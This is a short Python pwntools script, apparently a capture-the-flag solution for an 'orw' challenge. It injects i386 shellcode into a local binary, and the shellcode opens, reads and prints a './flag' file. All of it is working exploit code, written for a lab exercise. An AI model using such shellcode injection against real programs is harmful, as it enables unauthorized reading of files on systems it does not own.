from pwn import*

r = process('./orw.bin')

context(arch='i386',os='linux')
#ontext.log_level = 'debug'

shellcode = ''
shellcode += shellcraft.pushstr('./flag')
shellcode += shellcraft.open('esp', 0, 0)
shellcode += shellcraft.read('eax', 'esp', 100)
shellcode += shellcraft.write(1, 'esp', 100)

r.recvuntil('shellcode:')
r.send(asm(shellcode))
log.success(r.recvline())
